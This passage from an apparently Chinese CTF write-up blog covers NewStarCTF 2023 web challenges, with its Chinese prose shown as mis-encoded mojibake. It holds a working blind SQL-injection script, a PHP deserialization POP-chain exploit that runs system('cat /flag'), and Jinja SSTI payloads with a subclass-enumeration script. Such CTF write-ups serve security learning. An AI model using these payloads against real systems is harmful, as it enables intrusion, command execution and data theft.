exists</code></p><p>äºŒåˆ†æ³•+å¸ƒå°”ç›²æ³¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://f74c4214-b1b0-4485-b876-75128295a980.node4.buuoj.cn:81/&#x27;</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low=<span class="hljs-number">31</span><br>    high=<span class="hljs-number">127</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;=high:<br>        payload = <span class="hljs-string">&quot;TMP0919&#x27;/**/And/**/if(Ascii(Substr(Database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<span class="hljs-comment">#ctf</span><br><span class="hljs-comment">#çˆ†åº“,æ³¨æ„é¢˜ç›®æœ‰è¿‡æ»¤å¤§å°å†™</span><br><span class="hljs-comment">#if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#ctf</span><br><span class="hljs-comment">#çˆ†è¡¨  grades,here_is_flag</span><br><span class="hljs-comment">#if(Ascii(Substr((Select(Group_Concat(Table_Name))From(InfOrmation_Schema.Tables)Where(Table_Schema=&#x27;ctf&#x27;)</span><br><span class="hljs-comment">#çˆ†å­—æ®µï¼š #if(Ascii(Substr((Select(Group_Concat(Column_name))From(InfOrmation_Schema.Columns)Where(table_name=&#x27;here_is_flag&#x27;))  </span><br><span class="hljs-comment">#çˆ†æ•°æ®ï¼š</span><br><span class="hljs-comment">#if(ascii(substr((select(flag)from(here_is_flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        r = requests.get(url+<span class="hljs-string">&quot;?id=&quot;</span>+payload)<br>        <span class="hljs-comment">#r = requests.get(url=url,params=paylaod)</span><br>        time.sleep(<span class="hljs-number">0.03</span>)<br>        <span class="hljs-comment">#print(r.text)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;TMP0919&quot;</span> <span class="hljs-keyword">in</span> r.text):<br>            low = mid+<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid-<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>    result+=<span class="hljs-built_in">chr</span>(high+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    time.sleep(<span class="hljs-number">0.03</span>)<br></code></pre></td></tr></table></figure><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>ååºåˆ—åŒ–ä¸­çš„popé“¾æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<span class="hljs-comment">//æ­£åˆ™åŒ¹é…nameä¸­æ‰€æœ‰å¤§å°å†™å­—ç¬¦åŠæ•°å­—ï¼Œè¿™ä¸ªnameè¦æ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œç›®æµ‹è¦æŠŠæŸä¸ªç±»èµ‹å€¼ç»™nameè°ƒç”¨__toStringæ–¹æ³•</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)//æœç„¶æœ‰ä¸ª<span class="hljs-title">__toString</span>ï¼Œåº”è¯¥è¦ä»<span class="hljs-title">__destruct</span>è·³åˆ°è¿™é‡Œ</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<span class="hljs-comment">//è°ƒç”¨ $funcå­˜å‚¨çš„å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªå»è°ƒç”¨__invokeå‡½æ•°</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)//åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨,åº”è¯¥è¦åˆ©ç”¨<span class="hljs-title">__invoke</span>è·³åˆ°è¿™é‡Œ</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<span class="hljs-comment">//unsetï¼Œé”€æ¯æŒ‡å®šå˜é‡ï¼Œé€šè¿‡è¿™ä¸ªè·³åˆ°__unset</span><br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)//å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<span class="hljs-title">unset</span>(<span class="hljs-params"></span>)æ—¶è¢«è°ƒç”¨</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <span class="hljs-comment">//å‡½æ•°æ‰§è¡Œ</span><br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <span class="hljs-comment">//ååºåˆ—åŒ–çš„å°¾å·´</span><br><br><span class="hljs-comment">//https://zhuanlan.zhihu.com/p/377676274</span><br></code></pre></td></tr></table></figure><p>å‡½æ•°è°ƒç”¨é¡ºåºï¼š</p><p><code>Beginä¸­çš„__destruct-&gt;Thenä¸­çš„__ToString-&gt;Superä¸­çš„__invoke-&gt;Handleä¸­çš„__call-&gt;CTFä¸­çš„end(unset)-&gt;WhiteGodä¸­çš„__unset</code></p><p><code>exp:</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br>    &#125;<br><br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;Thenfunc&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;*obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;*obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;</span><br><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šç§æœ‰å˜é‡åºåˆ—åŒ–åä¸å…‰ä¼šåœ¨å˜é‡åå‰åŠ ä¸Šç±»åï¼Œè€Œä¸”è¿˜ä¼šåœ¨ç±»åå‰åå„åŠ ä¸€ä¸ªç©ºç™½å­—ç¬¦<code>%00</code>ã€‚<code>protected</code>å±æ€§å€’ä¸ä¼šåœ¨å˜é‡åå‰åŠ ç±»åï¼Œä½†ä»–ä¼šå…ˆåŠ ä¸€ä¸ª<code>*</code>ï¼Œç„¶ååœ¨<code>*</code>ä¹‹å‰åˆ†åˆ«åŠ ä¸Š<code>%00</code></p><p>æ‰€ä»¥è¦ä¿®æ”¹ä¸ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Begin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;name&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Then&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00Then%00func&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Super&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00*%00obj&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Handle&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00*%00obj&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;CTF&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;handle&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;WhiteGod&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;var&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">9</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;cat /flag&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ç„¶å<code>post</code>ä¼ <code>pop</code>å°±è¡Œäº†~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å…¶å®å¦‚æœéƒ½æ˜¯publicçš„è¯å¯ä»¥è¿™æ ·åšï¼Œå¯èƒ½æ›´å¥½ç†è§£ä¸€äº›ï¼ˆä¸è¿‡ç§æœ‰å±æ€§åªèƒ½åœ¨å®šä¹‰å®ƒä»¬çš„ç±»å†…éƒ¨è®¿é—®ï¼Œè€Œä¸èƒ½åœ¨ç±»å¤–éƒ¨æˆ–å­ç±»ä¸­ç›´æ¥è®¿é—®ã€‚ï¼‰ï¼š</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br><span class="hljs-variable">$a</span> -&gt; name = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//ç±»çš„å®ä¾‹è¢«å½“å­—ç¬¦ä¸²ï¼Œè°ƒç”¨tostringå‡½æ•°</span><br><span class="hljs-variable">$b</span> -&gt; func = <span class="hljs-variable">$c</span>;<span class="hljs-comment">//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ç±»ï¼Œè§¦å‘__invokeå‡½æ•°</span><br><span class="hljs-variable">$c</span> -&gt; obj = <span class="hljs-variable">$d</span>;<span class="hljs-comment">//åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è§¦å‘__callå‡½æ•°</span><br><span class="hljs-variable">$d</span> -&gt; obj = <span class="hljs-variable">$e</span>;<span class="hljs-comment">//è§¦å‘CTFç±»ä¸­çš„end()å‡½æ•°ï¼Œè°ƒç”¨unset</span><br><span class="hljs-variable">$e</span> -&gt; handle = <span class="hljs-variable">$f</span>;<br></code></pre></td></tr></table></figure><p>ç†è§£äº†ä¸Šé¢è¿™ä¸ªé“¾å­çš„æ„é€ æ–¹æ³•æ”¹ä¸€æ”¹å†æ”¾è¿›å»å°±è¡Œ,å…¶å®å°±æ˜¯é€šè¿‡ç±»å†…éƒ¨æä¾›çš„å…¬å…±æ–¹æ³•æ¥é—´æ¥è®¿é—®ç§æœ‰å±æ€§ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$privateProperty</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setPrivateProperty</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;privateProperty = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPrivateProperty</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;privateProperty;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$example</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();<br><span class="hljs-variable">$example</span>-&gt;<span class="hljs-title function_ invoke__">setPrivateProperty</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>); <span class="hljs-comment">// é€šè¿‡å…¬å…±æ–¹æ³•é—´æ¥è®¿é—®ç§æœ‰å±æ€§</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$example</span>-&gt;<span class="hljs-title function_ invoke__">getPrivateProperty</span>(); <span class="hljs-comment">// é€šè¿‡å…¬å…±æ–¹æ³•é—´æ¥è®¿é—®ç§æœ‰å±æ€§çš„å€¼</span><br></code></pre></td></tr></table></figure><p>å…¶å®è¿™é¢˜æˆ‘çœ‹ä¸€äº›äººçš„åšæ³•ç›´æ¥<code>urlencode</code>åºåˆ—åŒ–ç»“æœå°±ç›´æ¥ä¼ è¿‡å»äº†ã€‚ã€‚ä½†æ˜¯æˆ‘çš„ä¸æˆåŠŸã€‚ã€‚ä¸çŸ¥é“ä¸ºå•¥:(</p><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p><img src="/img/genshin1.png" alt="genshin1"></p><p><code>dirsearch</code>æ²¡æ‰«å‡ºæ¥å•¥ï¼Œ<code>bp</code>æŠ“åŒ…å‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/genshin4.png" alt="genshin4"></p><p><code>secr3tofpop</code>ï¼Œè®¿é—®å°±è¡Œ</p><p><img src="/img/genshin2.png" alt="genshin2"></p><p><code>node4.buuoj.cn:81/secr3tofpop?name=1</code></p><p><img src="/img/genshin3.png" alt="genshin3"></p><p><code>name</code>çš„å€¼ä¼šå›æ˜¾åˆ°é¡µé¢ä¸Šï¼ŒçŒœæµ‹<code>SSTI</code>ï¼Œå…ˆåˆ¤æ–­ç±»å‹ï¼š</p><p><code>/secr3tofpop?name=$&#123;7*7&#125;</code>ï¼š</p><p><img src="/img/genshin5.png" alt="genshin5"></p><p><code>/secr3tofpop?name=&#123;&#123;7*7&#125;&#125;</code></p><p><img src="/img/genshin6.png" alt="genshin6"></p><p>ç»è¿‡æµ‹è¯•å•ä¸ª<code>&#123;&#125;</code>æ²¡è¢«è¿‡æ»¤ï¼Œä½†<code>&#123;&#123;&#125;&#125;</code>ä¼šè¢«æ£€æµ‹åˆ°ã€‚è€Œä¸”å¼•å·<code>&#39;&#39;</code>ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚</p><p>å¼•å·è¿‡æ»¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•°ç»„<code>[]</code>æˆ–è€…ç›´æ¥<code>config</code>æ‰¾ä»–çš„çˆ¹ï¼Œè‡³äºåŒæ‹¬å·è¢«è¿‡æ»¤ï¼Œç½‘ä¸Šæ‰¾äº†ç¯‡æ–‡ç« ï¼š</p><p><code>https://blog.csdn.net/weixin_73051164/article/details/132574970</code></p><p><code>?name=&#123;%%20print([].__class__.__base__.__subclasses__())%20%&#125;</code>:</p><p><code>/secr3tofpop?name=%7b%%20print([].__class__.__base__.__subclasses__())%20%%7D</code></p><p><img src="/img/genshin7.png" alt="genshin7"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    url = <span class="hljs-string">&quot;http://3ae9f2a4-38eb-4d14-9b46-74045fd576fb.node4.buuoj.cn:81/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;])%20%&#125;&quot;</span>  <br><br>    s = requests.get(url=url)<br>    time.sleep(<span class="hljs-number">0.06</span>)<br>    <span class="hljs-comment">#print(s.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">in</span> s.text:<br>        <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç è¿è¡Œçš„æ—¶å€™ä¼šå‡ºé—®é¢˜ï¼Œæ¯”å¦‚ï¼š</p><p><img src="/img/genshin8.png" alt="genshin8"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 